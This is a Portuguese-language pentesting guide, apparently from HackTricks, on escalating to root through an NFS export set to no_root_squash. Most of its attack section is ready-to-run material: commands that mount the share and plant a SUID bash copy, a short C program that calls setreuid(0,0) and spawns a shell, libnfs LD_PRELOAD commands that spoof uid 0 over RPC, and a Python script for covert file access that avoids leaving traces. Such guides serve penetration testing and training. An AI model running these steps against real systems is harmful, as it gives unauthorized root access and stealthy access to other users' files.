# Escalonamento de Privilégios por Misconfiguration de No Root Squash no NFS

{{#include ../../banners/hacktricks-training.md}}


## Informações Básicas sobre Squashing

O NFS normalmente (especialmente no Linux) confia no `uid` e `gid` indicados pelo cliente que se conecta para acessar os arquivos (se o kerberos não for usado). No entanto, existem algumas configurações que podem ser definidas no servidor para **alterar esse comportamento**:

- **`all_squash`**: aplica squash a todos os acessos, mapeando cada usuário e grupo para **`nobody`** (65534 sem sinal / -2 com sinal). Portanto, todos são `nobody` e nenhum usuário é utilizado.
- **`root_squash`/`no_all_squash`**: esse é o padrão no Linux e aplica squash **somente aos acessos com uid 0 (root)**. Portanto, qualquer `UID` e `GID` é confiável, mas `0` é convertido para `nobody` (portanto, nenhuma impersonation de root é possível).
- **``no_root_squash`**: quando habilitada, essa configuração nem sequer aplica squash ao usuário root. Isso significa que, se você montar um diretório com essa configuração, poderá acessá-lo como root.

No arquivo **/etc/exports**, se você encontrar algum diretório configurado como **no_root_squash**, poderá **acessá-lo** a partir de um **cliente** e **escrever dentro** desse diretório **como** se fosse o **root** local da máquina.

Para obter mais informações sobre **NFS**, consulte:


{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Escalonamento de Privilégios

### Exploit Remoto

Opção 1 usando bash:
- **Montar esse diretório** em uma máquina cliente e, **como root, copiar** o binário **/bin/bash** para dentro da pasta montada, concedendo-lhe permissões **SUID**, e **executar a partir da máquina vítima** esse binário do bash.
- Observe que, para ser root dentro do compartilhamento NFS, **`no_root_squash`** deve estar configurado no servidor.
- No entanto, se não estiver habilitado, você poderá escalar para outro usuário copiando o binário para o compartilhamento NFS e concedendo-lhe a permissão SUID como o usuário para o qual deseja escalar.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Option 2 usando código compilado em C:
- **Montar esse diretório** em uma máquina cliente e, **como root, copiar** dentro da pasta montada nosso payload compilado que abusará da permissão SUID, conceder a ele direitos **SUID** e **executar na máquina da vítima** esse binário (você pode encontrar alguns [payloads SUID em C](../processes-crontab-systemd-dbus/payloads-to-execute.md#c) aqui).
- Mesmas restrições de antes
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Exploit Local

> [!TIP]
> Observe que, se você puder criar um **túnel da sua máquina até a máquina vítima, ainda poderá usar a versão Remote para explorar essa privilege escalation, fazendo o tunnelling das portas necessárias**.\
> O truque a seguir se aplica caso o arquivo `/etc/exports` **indique um IP**. Nesse caso, você **não poderá usar** de forma alguma o **remote exploit** e precisará **abusar desse truque**.\
> Outro requisito necessário para que o exploit funcione é que o **export dentro de `/etc/export`** **deve estar usando a flag `insecure`**.\
> --_Não tenho certeza de que, se `/etc/export` estiver indicando um endereço IP, esse truque funcionará_--

### Informações Básicas

O cenário envolve explorar um NFS share montado em uma máquina local, aproveitando uma falha na especificação NFSv3 que permite ao cliente especificar seu uid/gid, potencialmente possibilitando acesso não autorizado. A exploração envolve o uso da [libnfs](https://github.com/sahlberg/libnfs), uma library que permite forjar chamadas NFS RPC.

#### Compilando a Library

As etapas de compilação da library podem exigir ajustes dependendo da versão do kernel. Neste caso específico, as syscalls do fallocate foram comentadas. O processo de compilação envolve os seguintes comandos:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Executando o Exploit

O exploit envolve criar um programa C simples (`pwn.c`) que eleva os privilégios para root e então executa um shell. O programa é compilado, e o binário resultante (`a.out`) é colocado no share com suid root, usando `ld_nfs.so` para falsificar o uid nas chamadas RPC:

1. **Compilar o código do exploit:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Coloque o exploit no compartilhamento e modifique suas permissões falsificando o uid:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Execute o exploit para obter privilégios de root:**
```bash
/mnt/share/a.out
#root
```
### Bônus: NFShell para acesso furtivo a arquivos

Depois de obter acesso root, para interagir com o NFS share sem alterar o proprietário (para evitar deixar rastros), é usado um script Python (nfsh.py). Esse script ajusta o uid para corresponder ao do arquivo acessado, permitindo interagir com arquivos no share sem problemas de permissão:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Execute como:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{{#include ../../banners/hacktricks-training.md}}
